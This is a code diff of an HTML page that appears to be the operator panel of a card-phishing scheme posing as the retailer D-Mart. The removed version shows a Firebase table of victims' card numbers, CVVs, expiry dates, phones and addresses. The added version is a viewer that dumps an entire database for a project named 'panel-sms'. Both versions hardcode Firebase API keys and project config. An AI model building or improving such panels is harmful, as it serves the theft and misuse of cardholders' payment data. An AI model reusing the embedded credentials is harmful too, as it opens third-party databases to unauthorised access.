@@ -1,108 +1,350 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Firebase Packages Table</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      padding: 20px;
-      background: #f9f9f9;
-    }
-    h2 {
-      text-align: center;
-    }
-    table {
-      border-collapse: collapse;
-      width: 100%;
-      background: white;
-      margin-top: 20px;
-    }
-    th, td {
-      border: 1px solid #ccc;
-      padding: 8px 12px;
-      text-align: left;
-      font-size: 14px;
-    }
-    th {
-      background: #f0f0f0;
-    }
-    tr:nth-child(even) {
-      background-color: #fafafa;
-    }
-  </style>
-
-  <!-- Firebase SDK -->
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Firebase Database Viewer</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            margin: 0;
+            font-size: 2.5em;
+            font-weight: 300;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            border-left: 5px solid #f39c12;
+        }
+        
+        .warning h3 {
+            margin-top: 0;
+            color: #e74c3c;
+        }
+        
+        .controls {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 25px;
+            flex-wrap: wrap;
+        }
+        
+        button {
+            background: linear-gradient(45deg, #3498db, #2980b9);
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(52, 152, 219, 0.3);
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(52, 152, 219, 0.4);
+        }
+        
+        button:disabled {
+            background: #bdc3c7;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .status {
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+        
+        .status.connecting {
+            background: #e3f2fd;
+            color: #1976d2;
+            border-left: 4px solid #2196f3;
+        }
+        
+        .status.connected {
+            background: #e8f5e8;
+            color: #2e7d32;
+            border-left: 4px solid #4caf50;
+        }
+        
+        .status.error {
+            background: #ffebee;
+            color: #c62828;
+            border-left: 4px solid #f44336;
+        }
+        
+        .json-container {
+            background: #1e1e1e;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 20px;
+            box-shadow: inset 0 2px 10px rgba(0, 0, 0, 0.3);
+        }
+        
+        .json-display {
+            color: #f8f8f2;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            max-height: 600px;
+            overflow-y: auto;
+            line-height: 1.5;
+        }
+        
+        .json-display::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        .json-display::-webkit-scrollbar-track {
+            background: #2d2d2d;
+            border-radius: 4px;
+        }
+        
+        .json-display::-webkit-scrollbar-thumb {
+            background: #555;
+            border-radius: 4px;
+        }
+        
+        .loading {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100px;
+        }
+        
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .path-input {
+            padding: 10px 15px;
+            border: 2px solid #ddd;
+            border-radius: 25px;
+            font-size: 14px;
+            width: 300px;
+            outline: none;
+            transition: border-color 0.3s ease;
+        }
+        
+        .path-input:focus {
+            border-color: #3498db;
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <div class="header">
+            <h1>🔥 Firebase Database Viewer</h1>
+            <p>D-Mart Website Database Explorer</p>
+        </div>
+        
+        <div class="content">
+            <div class="warning">
+                <h3>⚠️ Security Warning</h3>
+                <p><strong>Your Firebase API key is publicly visible!</strong> This is a security risk. Consider:</p>
+                <ul>
+                    <li>Using environment variables to store sensitive config</li>
+                    <li>Setting up Firebase Security Rules to restrict access</li>
+                    <li>Regenerating your API key if this was exposed publicly</li>
+                </ul>
+            </div>
+            
+            <div class="controls">
+                <input type="text" class="path-input" id="dbPath" placeholder="Database path (e.g., users, products)" value="">
+                <button onclick="loadData()">Load Data</button>
+                <button onclick="loadFullDatabase()">Load Full Database</button>
+                <button onclick="clearDisplay()">Clear</button>
+            </div>
+            
+            <div id="status" class="status connecting" style="display: none;">
+                Connecting to Firebase...
+            </div>
+            
+            <div class="json-container">
+                <div id="jsonDisplay" class="json-display">
+                    Click "Load Data" or "Load Full Database" to view your Firebase data...
+                </div>
+            </div>
+        </div>
+    </div>
 
-  <h2>📦 Packages from Firebase (Realtime)</h2>
-  <table id="packagesTable">
-    <thead>
-      <tr>
-        <th>#</th>
-        <th>Card Number</th>
-        <th>Name</th>
-        <th>Phone</th>
-        <th>Expiry</th>
-        <th>CVV</th>
-        <th>Method</th>
-        <th>Address</th>
-        <th>Time</th>
-      </tr>
-    </thead>
-    <tbody></tbody>
-  </table>
+    <!-- Firebase SDK -->
+    <script type="module">
+        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js';
+        import { getDatabase, ref, get, child } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js';
 
-  <script>
-    // ✅ Your Firebase Config
-    const firebaseConfig = {
-      apiKey: "AIzaSyDxlxSBiCEFf0PtWKoCSsA6BcpibN85x-Y",
-      authDomain: "dmart-website-6c48c.firebaseapp.com",
-      databaseURL: "https://dmart-website-6c48c-default-rtdb.firebaseio.com",
-      projectId: "dmart-website-6c48c",
-      storageBucket: "dmart-website-6c48c.appspot.com",
-      messagingSenderId: "960037120520",
-      appId: "1:960037120520:web:952c932d345bca51d03fbd",
-      measurementId: "G-51BMQD6D13"
-    };
+        // Your Firebase configuration
+        const firebaseConfig = {
+    apiKey: "AIzaSyDo2z88qyi7ohUf85NjyxF9D7S-ip8xfxc",
+    authDomain: "panel-sms.firebaseapp.com", // derived from project_id
+    databaseURL: "https://panel-sms-default-rtdb.firebaseio.com", // derived from project_id
+    projectId: "panel-sms",
+    storageBucket: "panel-sms.firebasestorage.app",
+    messagingSenderId: "10331049274",
+    appId: "1:10331049274:android:dac2117586a74749615403"
+        };
 
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+        // Initialize Firebase
+        let app, database;
+        
+        try {
+            app = initializeApp(firebaseConfig);
+            database = getDatabase(app);
+            showStatus('Connected to Firebase!', 'connected');
+        } catch (error) {
+            showStatus(`Connection failed: ${error.message}`, 'error');
+        }
 
-    const tableBody = document.querySelector("#packagesTable tbody");
+        // Make functions global
+        window.loadData = loadData;
+        window.loadFullDatabase = loadFullDatabase;
+        window.clearDisplay = clearDisplay;
 
-    db.ref("/packages").on("value", (snapshot) => {
-      tableBody.innerHTML = ""; // Clear table
-      const data = snapshot.val();
-      if (!data) {
-        tableBody.innerHTML = "<tr><td colspan='9'>No data available.</td></tr>";
-        return;
-      }
+        function showStatus(message, type) {
+            const statusEl = document.getElementById('status');
+            statusEl.textContent = message;
+            statusEl.className = `status ${type}`;
+            statusEl.style.display = 'block';
+            
+            if (type === 'connected') {
+                setTimeout(() => {
+                    statusEl.style.display = 'none';
+                }, 3000);
+            }
+        }
 
-      let index = 1;
-      Object.entries(data).forEach(([key, value]) => {
-        const card = value.cardDetails;
-        if (!card || !card.cardNumber) return; // skip if no card number
+        function showLoading() {
+            document.getElementById('jsonDisplay').innerHTML = `
+                <div class="loading">
+                    <div class="spinner"></div>
+                </div>
+            `;
+        }
 
-        const row = document.createElement("tr");
-        row.innerHTML = `
-          <td>${index++}</td>
-          <td>${card.cardNumber}</td>
-          <td>${card.fullName || ""}</td>
-          <td>${card.mobileNumber || ""}</td>
-          <td>${card.expiryMM || ""} / ${card.expiryYY || ""}</td>
-          <td>${card.cvv || ""}</td>
-          <td>${card.paymentMethod || ""}</td>
-          <td>${card.address || ""}, ${card.city || ""}, ${card.state || ""} - ${card.pincode || ""}</td>
-          <td>${card.timestamp || ""}</td>
-        `;
-        tableBody.appendChild(row);
-      });
-    });
-  </script>
+        function displayData(data, path = '') {
+            const jsonDisplay = document.getElementById('jsonDisplay');
+            
+            if (data === null || data === undefined) {
+                jsonDisplay.textContent = `No data found at path: ${path || 'root'}`;
+                return;
+            }
 
+            // Pretty print JSON with syntax highlighting
+            const jsonString = JSON.stringify(data, null, 2);
+            jsonDisplay.textContent = jsonString;
+        }
+
+        async function loadData() {
+            if (!database) {
+                showStatus('Database not connected!', 'error');
+                return;
+            }
+
+            const path = document.getElementById('dbPath').value.trim();
+            showLoading();
+            showStatus('Loading data...', 'connecting');
+
+            try {
+                const dbRef = ref(database);
+                const snapshot = await get(child(dbRef, path));
+                
+                if (snapshot.exists()) {
+                    displayData(snapshot.val(), path);
+                    showStatus(`Data loaded from: ${path || 'root'}`, 'connected');
+                } else {
+                    displayData(null, path);
+                    showStatus(`No data available at: ${path || 'root'}`, 'error');
+                }
+            } catch (error) {
+                document.getElementById('jsonDisplay').textContent = `Error: ${error.message}`;
+                showStatus(`Error loading data: ${error.message}`, 'error');
+                console.error('Firebase error:', error);
+            }
+        }
+
+        async function loadFullDatabase() {
+            if (!database) {
+                showStatus('Database not connected!', 'error');
+                return;
+            }
+
+            showLoading();
+            showStatus('Loading full database...', 'connecting');
+
+            try {
+                const dbRef = ref(database);
+                const snapshot = await get(dbRef);
+                
+                if (snapshot.exists()) {
+                    displayData(snapshot.val());
+                    showStatus('Full database loaded successfully!', 'connected');
+                } else {
+                    displayData(null);
+                    showStatus('Database is empty', 'error');
+                }
+            } catch (error) {
+                document.getElementById('jsonDisplay').textContent = `Error: ${error.message}`;
+                showStatus(`Error loading database: ${error.message}`, 'error');
+                console.error('Firebase error:', error);
+            }
+        }
+
+        function clearDisplay() {
+            document.getElementById('jsonDisplay').textContent = 'Click "Load Data" or "Load Full Database" to view your Firebase data...';
+            document.getElementById('dbPath').value = '';
+            document.getElementById('status').style.display = 'none';
+        }
+
+        // Auto-connect on load
+        showStatus('Connecting to Firebase...', 'connecting');
+    </script>
 </body>
 </html>
